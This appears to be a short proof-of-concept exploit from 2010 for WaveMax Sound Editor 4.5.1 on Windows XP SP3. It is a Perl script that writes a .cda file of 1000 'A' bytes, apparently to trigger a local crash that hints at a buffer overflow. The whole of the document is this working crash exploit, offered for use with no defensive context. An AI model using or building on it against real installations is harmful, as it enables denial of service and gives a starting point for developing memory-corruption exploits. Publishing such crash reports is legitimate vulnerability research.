####
####
####Exploit Title: WaveMax Sound Editor 4.5.1 Local Crash PoC
####Software Link: http://www.wave-max.com/wavemax/
####Tested on: Win XP SP3
####Date: 04-12-2010
####Author:  h1ch4m
####Email: h1ch4m@live.fr
####
####



my $file= "1.cda";
my $junk = "\x41" x 1000;
open($FILE,">$file");
print $FILE $junk;
close($FILE);
print "File Created successfully\n";
sleep(1);